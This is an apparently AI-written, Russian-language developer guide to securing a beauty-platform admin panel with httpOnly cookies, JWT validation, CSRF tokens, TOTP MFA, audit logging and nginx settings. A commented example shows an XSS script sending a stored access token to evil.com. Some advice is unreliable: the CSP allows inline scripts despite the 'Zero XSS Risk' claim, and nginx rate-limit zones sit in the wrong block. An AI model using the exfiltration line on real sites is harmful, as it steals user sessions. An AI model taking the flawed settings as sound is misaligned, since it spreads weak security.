# 🔐 ADMIN PANEL SECURITY GUIDE - Beauty Platform

> **ДЛЯ РАЗРАБОТЧИКОВ**: Полное руководство по безопасной реализации аутентификации админ-панели  
> **Дата**: 2025-08-12  
> **Статус**: КРИТИЧНО - ОБЯЗАТЕЛЬНО К ВЫПОЛНЕНИЮ  
> **Уровень**: Enterprise Security Standards 2024

---

## 🚨 **КРИТИЧЕСКАЯ ИНФОРМАЦИЯ**

### **⚠️ ЧТО НЕЛЬЗЯ ДЕЛАТЬ (ЗАПРЕЩЕНО!):**

```typescript
// ❌ НИКОГДА НЕ ДЕЛАЙ ТАК:
localStorage.setItem('token', accessToken)           // XSS уязвимость!
sessionStorage.setItem('refresh', refreshToken)     // XSS уязвимость!
const token = jwt.sign(payload, 'weak-secret')      // Слабый секрет!
fetch('/api/admin', { credentials: 'omit' })        // Нет cookie!
if (user.role === 'admin') { /* без MFA */ }        // Нет 2FA!
```

### **✅ ПРАВИЛЬНЫЙ ПОДХОД:**

```typescript
// ✅ БЕЗОПАСНО:
// 1. httpOnly cookies вместо localStorage
res.cookie('accessToken', token, {
  httpOnly: true,      // Защита от XSS
  secure: true,        // Только HTTPS
  sameSite: 'strict',  // CSRF protection
  maxAge: 15 * 60 * 1000 // 15 минут
})

// 2. Сильные JWT секреты (64+ символов)
const JWT_SECRET = process.env.JWT_SECRET; // Минимум 64 символа!

// 3. Полная валидация токенов
const decoded = jwt.verify(token, JWT_SECRET, {
  issuer: 'beauty-platform',
  audience: 'beauty-admin',
  algorithms: ['HS256']
})

// 4. MFA для Super Admin
if (user.role === 'SUPER_ADMIN' && !user.mfaVerified) {
  throw new Error('2FA required')
}
```

---

## 🏗️ **АРХИТЕКТУРА БЕЗОПАСНОСТИ**

### **Централизованная аутентификация с распределенной авторизацией:**

```mermaid
graph TD
    A[Admin Panel :6002] --> B[API Gateway :6020]
    B --> C[Auth Service :6021]
    C --> D[PostgreSQL beauty_platform_new]
    C --> E[Audit Database beauty_audit]
    
    F[Other Services] --> B
    F --> G[JWT Validation Locally]
    
    H[nginx TLS 1.3] --> A
    H --> B
```

### **Поток аутентификации:**

1. **Логин** → Auth Service проверяет credentials + MFA
2. **JWT Issue** → Auth Service выдает подписанный токен  
3. **Cookie Set** → httpOnly cookie с токеном
4. **Request** → Каждый запрос валидирует JWT локально
5. **Audit** → Все действия логируются в отдельную БД

---

## 🔑 **1. БЕЗОПАСНОЕ ХРАНЕНИЕ ТОКЕНОВ**

### **❌ НЕ ИСПОЛЬЗУЙ localStorage/sessionStorage:**

```typescript
// ❌ УЯЗВИМО К XSS АТАКАМ:
localStorage.setItem('beauty_access_token', token)
sessionStorage.setItem('beauty_refresh_token', refreshToken)

// Любой XSS скрипт может украсть токены:
// <script>fetch('evil.com', {body: localStorage.getItem('beauty_access_token')})</script>
```

### **✅ ИСПОЛЬЗУЙ httpOnly Cookies:**

```typescript
// ✅ БЕЗОПАСНО - защищено от XSS:
// В Auth Service (6021):
app.post('/auth/login', async (req, res) => {
  // ... проверка credentials + MFA ...
  
  const accessToken = jwt.sign(payload, JWT_SECRET, { expiresIn: '15m' })
  const refreshToken = jwt.sign(refreshPayload, JWT_SECRET, { expiresIn: '7d' })
  
  // Устанавливаем безопасные cookies
  res.cookie('beauty_access_token', accessToken, {
    httpOnly: true,        // JavaScript не может получить доступ
    secure: true,          // Только через HTTPS
    sameSite: 'strict',    // Защита от CSRF
    maxAge: 15 * 60 * 1000 // 15 минут
  })
  
  res.cookie('beauty_refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 дней
  })
  
  res.json({ success: true, user: userInfo })
})
```

### **🔄 Обновление клиентского кода:**

```typescript
// ✅ НОВЫЙ AuthContext (без localStorage):
export const AuthProvider: React.FC<AuthProviderProps> = ({ children }) => {
  const [authState, setAuthState] = useState<AuthState>({
    user: null,
    isAuthenticated: false,
    isLoading: true,
    accessToken: null // НЕ храним токен в state!
  })

  const login = async (email: string, password: string) => {
    const response = await fetch('/auth/login', {
      method: 'POST',
      credentials: 'include', // КРИТИЧНО! Отправляет cookies
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    })
    
    if (response.ok) {
      const { user } = await response.json()
      setAuthState({
        user,
        isAuthenticated: true,
        isLoading: false,
        accessToken: null // Cookie автоматически сохранен браузером
      })
    }
  }

  const logout = async () => {
    await fetch('/auth/logout', {
      method: 'POST',
      credentials: 'include' // Отправляет cookie для валидации
    })
    
    setAuthState({
      user: null,
      isAuthenticated: false,
      isLoading: false,
      accessToken: null
    })
  }
}
```

---

## 🛡️ **2. JWT SECURITY (Enterprise Level)**

### **🔐 Сильные секреты:**

```bash
# В .env файле (ОБЯЗАТЕЛЬНО 64+ символов):
JWT_SECRET=your_ultra_secure_64_character_random_string_for_jwt_signing_2024_enterprise_grade_security

# Проверка длины секрета:
if (!process.env.JWT_SECRET || process.env.JWT_SECRET.length < 64) {
  throw new Error('JWT_SECRET must be at least 64 characters')
}
```

### **✅ Полная валидация JWT:**

```typescript
// core/shared/middleware/jwt-validation.ts
import jwt from 'jsonwebtoken'

interface JWTPayload {
  userId: string
  tenantId: string
  role: 'SUPER_ADMIN' | 'SALON_OWNER' | 'STAFF_MEMBER'
  permissions: string[]
  iat: number
  exp: number
  iss: string  // Издатель
  aud: string  // Аудитория
}

export const validateJWT = (token: string): JWTPayload => {
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET!, {
      issuer: 'beauty-platform',           // Проверяем издателя
      audience: 'beauty-admin-panel',      // Проверяем аудиторию
      algorithms: ['HS256'],               // Только безопасный алгоритм
      clockTolerance: 10                   // 10 сек на рассинхрон часов
    }) as JWTPayload

    // Дополнительные проверки
    if (!decoded.userId || !decoded.role) {
      throw new Error('Invalid token payload')
    }

    // Проверка прав для админки
    if (decoded.aud === 'beauty-admin-panel' && decoded.role !== 'SUPER_ADMIN') {
      throw new Error('Insufficient privileges for admin panel')
    }

    return decoded
  } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
      throw new Error('Token expired')
    }
    if (error instanceof jwt.JsonWebTokenError) {
      throw new Error('Invalid token')
    }
    throw new Error('Token validation failed')
  }
}
```

### **⏱️ Правильное время жизни токенов:**

```typescript
// ✅ БЕЗОПАСНЫЕ ИНТЕРВАЛЫ:
const TOKEN_CONFIG = {
  accessToken: '15m',    // Короткие access токены
  refreshToken: '7d',    // Длинные refresh токены
  adminSession: '4h',    // Сессия админа (максимум)
  mfaGrace: '5m'        // Время после MFA
}

// Автоматическое обновление:
setInterval(async () => {
  try {
    await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    })
  } catch (error) {
    // Перенаправить на логин
    window.location.href = '/login'
  }
}, 12 * 60 * 1000) // Обновляем каждые 12 минут
```

---

## 🛡️ **3. CSRF PROTECTION**

### **🔒 Настройка CSRF в Auth Service:**

```typescript
// services/auth-service/src/server.ts
import csrf from 'csurf'

// CSRF protection middleware
const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    key: '_csrf'
  }
})

// Применяем к изменяющим маршрутам
app.use('/auth/login', csrfProtection)
app.use('/auth/logout', csrfProtection)
app.use('/auth/refresh', csrfProtection)

// Эндпоинт для получения CSRF токена
app.get('/auth/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() })
})
```

### **📱 Использование CSRF в клиенте:**

```typescript
// apps/admin-panel/src/hooks/useCSRF.ts
export const useCSRF = () => {
  const [csrfToken, setCsrfToken] = useState<string | null>(null)

  useEffect(() => {
    // Получаем CSRF токен при загрузке
    fetch('/auth/csrf-token', { credentials: 'include' })
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken))
  }, [])

  const makeSecureRequest = async (url: string, options: RequestInit = {}) => {
    return fetch(url, {
      ...options,
      credentials: 'include',
      headers: {
        ...options.headers,
        'X-CSRF-Token': csrfToken || '',
        'Content-Type': 'application/json'
      }
    })
  }

  return { csrfToken, makeSecureRequest }
}
```

---

## 🔐 **4. MULTI-FACTOR AUTHENTICATION (MFA)**

### **📱 Обязательная 2FA для Super Admin:**

```typescript
// core/domain/auth/mfa.ts
export class MFAService {
  // Генерация QR кода для TOTP
  static generateTOTPSecret(userId: string): { secret: string, qrCode: string } {
    const secret = speakeasy.generateSecret({
      name: `Beauty Platform (${userId})`,
      issuer: 'Beauty Platform',
      length: 32
    })

    return {
      secret: secret.base32,
      qrCode: qrcode.toDataURL(secret.otpauth_url!)
    }
  }

  // Проверка TOTP кода
  static verifyTOTP(secret: string, token: string): boolean {
    return speakeasy.totp.verify({
      secret,
      encoding: 'base32',
      token,
      window: 2 // Допускаем рассинхрон на 60 сек
    })
  }

  // Проверка бэкап кодов
  static verifyBackupCode(userId: string, code: string): Promise<boolean> {
    // Проверяем одноразовый бэкап код
    // После использования - удаляем из БД
  }
}
```

### **🔒 Принудительная MFA проверка:**

```typescript
// services/auth-service/src/middleware/mfa.ts
export const requireMFA = async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
  const user = req.user!

  // Super Admin ОБЯЗАТЕЛЬНО должен иметь MFA
  if (user.role === 'SUPER_ADMIN') {
    if (!user.mfaEnabled) {
      return res.status(403).json({
        error: 'MFA_REQUIRED',
        message: 'Multi-factor authentication is required for admin access',
        redirectTo: '/setup-mfa'
      })
    }

    // Проверяем, что MFA был пройден в текущей сессии
    const mfaVerified = req.session?.mfaVerified
    const mfaTimestamp = req.session?.mfaTimestamp

    if (!mfaVerified || !mfaTimestamp) {
      return res.status(403).json({
        error: 'MFA_VERIFICATION_REQUIRED',
        message: 'Please verify your MFA code',
        redirectTo: '/verify-mfa'
      })
    }

    // MFA действует только 5 минут для критичных операций
    const mfaAge = Date.now() - mfaTimestamp
    if (mfaAge > 5 * 60 * 1000) {
      return res.status(403).json({
        error: 'MFA_EXPIRED',
        message: 'MFA verification expired, please verify again',
        redirectTo: '/verify-mfa'
      })
    }
  }

  next()
}

// Применение к критичным эндпоинтам
app.use('/admin/users', requireMFA)
app.use('/admin/salons', requireMFA) 
app.use('/admin/settings', requireMFA)
```

---

## 📊 **5. COMPREHENSIVE AUDIT SYSTEM**

### **🗄️ Отдельная база для аудита:**

```sql
-- Создаем отдельную БД для audit логов
CREATE DATABASE beauty_audit;

-- Таблица аудита админских действий
CREATE TABLE admin_audit_log (
    id BIGSERIAL PRIMARY KEY,
    
    -- Информация о действии
    action VARCHAR(50) NOT NULL,          -- 'LOGIN', 'LOGOUT', 'CREATE_SALON', 'DELETE_USER'
    resource_type VARCHAR(50),            -- 'SALON', 'USER', 'SETTINGS'
    resource_id VARCHAR(50),              -- ID ресурса
    
    -- Информация о пользователе
    user_id VARCHAR(50) NOT NULL,
    user_email VARCHAR(100) NOT NULL,
    user_role VARCHAR(20) NOT NULL,
    
    -- Техническая информация
    ip_address INET NOT NULL,
    user_agent TEXT,
    session_id VARCHAR(100),
    
    -- Данные изменений
    old_values JSONB,                     -- Старые значения
    new_values JSONB,                     -- Новые значения
    
    -- Результат
    success BOOLEAN NOT NULL DEFAULT true,
    error_message TEXT,
    
    -- Метаданные
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    request_id VARCHAR(50),               -- Для корреляции
    
    -- Индексы для быстрого поиска
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Индексы для производительности
CREATE INDEX idx_admin_audit_user_id ON admin_audit_log(user_id);
CREATE INDEX idx_admin_audit_action ON admin_audit_log(action);
CREATE INDEX idx_admin_audit_timestamp ON admin_audit_log(timestamp);
CREATE INDEX idx_admin_audit_ip ON admin_audit_log(ip_address);
```

### **📝 Middleware для аудита:**

```typescript
// core/shared/middleware/audit.ts
export const auditLogger = (action: string, resourceType?: string) => {
  return (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
    const startTime = Date.now()
    const originalSend = res.send

    // Перехватываем ответ для логирования результата
    res.send = function(data) {
      const responseTime = Date.now() - startTime
      const success = res.statusCode < 400

      // Логируем в audit БД
      auditLog({
        action,
        resourceType,
        resourceId: req.params.id || req.body.id,
        userId: req.user!.id,
        userEmail: req.user!.email,
        userRole: req.user!.role,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent'),
        sessionId: req.sessionID,
        oldValues: req.body.oldValues,
        newValues: req.body,
        success,
        errorMessage: success ? null : data,
        responseTime,
        requestId: req.get('X-Request-ID'),
        timestamp: new Date()
      })

      return originalSend.call(this, data)
    }

    next()
  }
}

// Использование:
app.post('/admin/salons', 
  authenticateJWT,
  requireMFA,
  auditLogger('CREATE_SALON', 'SALON'),
  createSalonHandler
)

app.delete('/admin/users/:id',
  authenticateJWT, 
  requireMFA,
  auditLogger('DELETE_USER', 'USER'),
  deleteUserHandler
)
```

---

## 🚀 **6. SECURE DEPLOYMENT CONFIG**

### **🌐 nginx конфигурация:**

```nginx
# /etc/nginx/sites-available/admin.beauty.designcorp.eu
server {
    listen 443 ssl http2;
    server_name test-admin.beauty.designcorp.eu;
    
    # SSL Configuration - TLS 1.3 only
    ssl_certificate /etc/letsencrypt/live/beauty.designcorp.eu/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/beauty.designcorp.eu/privkey.pem;
    ssl_protocols TLSv1.3;
    ssl_prefer_server_ciphers off;
    
    # Security Headers (Enterprise 2024)
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # CSP для Admin Panel (строгий)
    add_header Content-Security-Policy "
        default-src 'self';
        script-src 'self' 'unsafe-inline';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        connect-src 'self' https://auth.beauty.designcorp.eu;
        font-src 'self';
        object-src 'none';
        media-src 'self';
        frame-src 'none';
        worker-src 'none';
        form-action 'self';
        upgrade-insecure-requests;
    " always;
    
    # Rate limiting для admin панели
    limit_req_zone $binary_remote_addr zone=admin_login:10m rate=5r/m;
    limit_req_zone $binary_remote_addr zone=admin_general:10m rate=60r/m;
    
    location /auth/login {
        limit_req zone=admin_login burst=3 nodelay;
        proxy_pass http://127.0.0.1:6021;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
    
    location / {
        limit_req zone=admin_general burst=20 nodelay;
        proxy_pass http://127.0.0.1:6002;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### **🔒 Environment переменные:**

```bash
# /root/beauty-platform/.env
NODE_ENV=production

# JWT Security (КРИТИЧНО!)
JWT_SECRET=your_ultra_secure_64_character_random_string_for_jwt_signing_2024_enterprise_grade_security_very_long_and_complex
JWT_ALGORITHM=HS256
JWT_ISSUER=beauty-platform
JWT_AUDIENCE_ADMIN=beauty-admin-panel

# Session Security
SESSION_SECRET=another_64_character_random_string_for_session_encryption_2024_enterprise
SESSION_MAX_AGE=14400000  # 4 часа для админов

# CSRF Protection
CSRF_SECRET=yet_another_64_character_random_string_for_csrf_protection_2024_enterprise

# Database URLs
DATABASE_URL=postgresql://beauty_user:secure_password@localhost:5432/beauty_platform_new
AUDIT_DATABASE_URL=postgresql://beauty_audit:audit_password@localhost:5432/beauty_audit

# MFA Settings
MFA_ISSUER=Beauty Platform
MFA_WINDOW=2
BACKUP_CODES_COUNT=10

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000    # 15 минут
RATE_LIMIT_MAX_REQUESTS=100    # Максимум запросов
ADMIN_RATE_LIMIT_MAX=60        # Для админки
```

---

## 📋 **7. IMPLEMENTATION CHECKLIST**

### **🔥 КРИТИЧНО - Реализовать немедленно:**

- [ ] **1. Заменить localStorage на httpOnly cookies**
  - [ ] Обновить AuthContext
  - [ ] Настроить CORS с credentials: 'include'
  - [ ] Тестировать в production

- [ ] **2. Добавить полную JWT валидацию**
  - [ ] Создать validateJWT функцию
  - [ ] Проверять iss, aud, alg
  - [ ] Добавить clockTolerance

- [ ] **3. Настроить CSRF protection**
  - [ ] Установить csurf middleware
  - [ ] Создать /csrf-token эндпоинт
  - [ ] Обновить все формы

- [ ] **4. Внедрить MFA для Super Admin**
  - [ ] Установить speakeasy + qrcode
  - [ ] Создать /setup-mfa эндпоинт
  - [ ] Добавить requireMFA middleware
  - [ ] Генерировать backup коды

- [ ] **5. Создать audit систему**
  - [ ] Создать отдельную БД beauty_audit
  - [ ] Реализовать auditLogger middleware
  - [ ] Логировать все админские действия
  - [ ] Настроить retention policy

### **⚠️ ВАЖНО - Реализовать в течение недели:**

- [ ] **6. Security Headers**
  - [ ] Обновить nginx конфиг
  - [ ] Добавить строгий CSP
  - [ ] Настроить HSTS

- [ ] **7. Rate Limiting**
  - [ ] Настроить rate limiting в nginx
  - [ ] Добавить express-rate-limit
  - [ ] Мониторинг попыток взлома

- [ ] **8. Monitoring & Alerting**
  - [ ] Логировать подозрительную активность
  - [ ] Настроить алерты для audit events
  - [ ] Dashboard для security metrics

### **📈 БУДУЩИЕ УЛУЧШЕНИЯ:**

- [ ] **9. Advanced Security**
  - [ ] IP whitelisting для админов
  - [ ] Geo-blocking подозрительных регионов
  - [ ] Behavioral analysis
  - [ ] Device fingerprinting

- [ ] **10. Compliance**
  - [ ] GDPR compliance для audit logs
  - [ ] SOC 2 Type II preparation
  - [ ] Regular security audits

---

## 🆘 **TROUBLESHOOTING**

### **🔍 Частые проблемы:**

#### **1. "Токены не сохраняются"**
```typescript
// ✅ РЕШЕНИЕ: Проверь CORS настройки
app.use(cors({
  origin: ['https://test-admin.beauty.designcorp.eu'],
  credentials: true  // КРИТИЧНО!
}))

// ✅ В клиенте:
fetch('/auth/login', {
  credentials: 'include'  // КРИТИЧНО!
})
```

#### **2. "CSRF token invalid"**
```typescript
// ✅ РЕШЕНИЕ: Получи токен перед запросом
const response = await fetch('/auth/csrf-token', { credentials: 'include' })
const { csrfToken } = await response.json()

// Используй в заголовках
fetch('/auth/login', {
  headers: {
    'X-CSRF-Token': csrfToken
  }
})
```

#### **3. "MFA setup fails"**
```typescript
// ✅ РЕШЕНИЕ: Проверь настройки TOTP
const secret = speakeasy.generateSecret({
  name: `Beauty Platform (${user.email})`,
  issuer: 'Beauty Platform',
  length: 32  // Достаточная длина
})
```

### **🚨 Security Incidents:**

#### **Если обнаружена атака:**
1. **Немедленно** - отключи админ панель
2. **Проверь** - audit logs на подозрительную активность
3. **Смени** - все JWT секреты
4. **Уведоми** - всех админов о необходимости re-login
5. **Расследуй** - источник атаки через логи

---

## 📞 **КОНТАКТЫ И ПОДДЕРЖКА**

### **🔐 Security Team:**
- **Technical Lead**: beauty-security@designcorp.eu
- **Emergency**: +1-XXX-XXX-XXXX (24/7)
- **Incident Response**: security-incidents@designcorp.eu

### **📚 Дополнительные ресурсы:**
- **OWASP Top 10 2024**: https://owasp.org/www-project-top-ten/
- **JWT Best Practices**: https://tools.ietf.org/html/rfc8725
- **Node.js Security**: https://nodejs.org/en/docs/guides/security/

---

## 🎯 **ЗАКЛЮЧЕНИЕ**

### **✅ После реализации всех мер у нас будет:**

1. **🔒 Enterprise Security** - защита от всех OWASP Top 10 2024
2. **🛡️ Zero XSS Risk** - httpOnly cookies + CSP
3. **🚫 CSRF Protection** - двойная защита cookies + tokens
4. **🔐 Strong MFA** - TOTP + backup codes для админов
5. **📊 Full Audit Trail** - все действия записываются
6. **⚡ Performance** - локальная валидация JWT
7. **🎯 Scalability** - централизованная аутентификация

### **⚠️ ПОМНИ:**

- **Безопасность** - это не одноразовая настройка, а процесс
- **Регулярно обновляй** зависимости и проверяй на уязвимости
- **Мониторь** подозрительную активность
- **Тестируй** security measures в staging среде
- **Обучай** команду лучшим практикам

---

**🔐 BEAUTY PLATFORM ADMIN PANEL = ENTERPRISE GRADE SECURITY** 🛡️

*Created by Claude on 2025-08-12 | Classification: INTERNAL - Security Documentation*